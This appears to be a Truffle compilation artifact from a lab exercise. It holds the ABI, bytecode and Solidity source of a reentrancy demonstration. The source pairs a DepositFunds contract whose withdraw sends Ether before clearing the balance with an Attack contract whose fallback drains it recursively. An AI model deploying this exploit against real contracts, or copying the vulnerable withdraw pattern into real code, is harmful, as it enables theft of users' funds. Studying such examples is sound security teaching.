{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_depositFundsAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "depositFunds",
      "outputs": [
        {
          "internalType": "contract DepositFunds",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610457380380610457833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610340806101176000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc146100f7578063e2c41dbc146101015761002e565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100f55760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b505050505b005b6100ff61012c565b005b34801561010d57600080fd5b5061011661024c565b60405161012391906102ef565b60405180910390f35b670de0b6b3a764000034101561014157600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101b157600080fd5b505af11580156101c5573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023257600080fd5b505af1158015610246573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102b56102b06102ab84610270565b610290565b610270565b9050919050565b60006102c78261029a565b9050919050565b60006102d9826102bc565b9050919050565b6102e9816102ce565b82525050565b600060208201905061030460008301846102e0565b9291505056fea26469706673582212206e2405ba93ba2f7ce9d1e94b5922fdc07efc56339f14fa0473eb03cf6c15e1c564736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.1;\r\n\r\ncontract DepositFunds {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw() public {\r\n        uint bal = balances[msg.sender];\r\n        require(bal > 0);\r\n\r\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n\r\n        balances[msg.sender] = 0;\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    DepositFunds public depositFunds;\r\n\r\n    constructor(address _depositFundsAddress) {\r\n        depositFunds = DepositFunds(_depositFundsAddress);\r\n    }\r\n\r\n    // Fallback is called when DepositFunds sends Ether to this contract.\r\n    fallback() external payable {\r\n        if (address(depositFunds).balance >= 1 ether) {\r\n            depositFunds.withdraw();\r\n        }\r\n    }\r\n\r\n    function attack() external payable {\r\n        require(msg.value >= 1 ether);\r\n        depositFunds.deposit{value: 1 ether}();\r\n        depositFunds.withdraw();\r\n    }\r\n\r\n}",
  "sourcePath": "C:\\Lab\\Sol-Test\\truffle-debugg\\contracts\\Reentrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-10-31T04:13:43.042Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}